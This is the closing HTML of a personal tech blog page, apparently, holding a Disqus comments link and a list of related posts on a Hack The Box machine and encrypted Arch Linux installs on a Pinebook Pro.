    <a href="https://disqus.com/?ref_noscript">comments powered by Disqus</a>.
  </noscript>



  </section>

  <section class="related">
  <h2>Related Posts</h2>
  <ul class="posts-list">
    
      <li>
        <h3>
          <a href="/hack-the-box-ophiuchi/">
            Hack The Box - Ophiuchi
            <small>16 Jul 2021</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/luks-encrypted-arch-linux-on-pinebook-pro-again/">
            Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root...Again
            <small>28 Jun 2021</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/luks-encrypted-arch-linux-on-pinebook-pro/">
            Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root
            <small>15 Dec 2020</small>
          </a>
        </h3>
      </li>
    
  </ul>
</section>

</div>

    </main>

    
  </body>
</html>
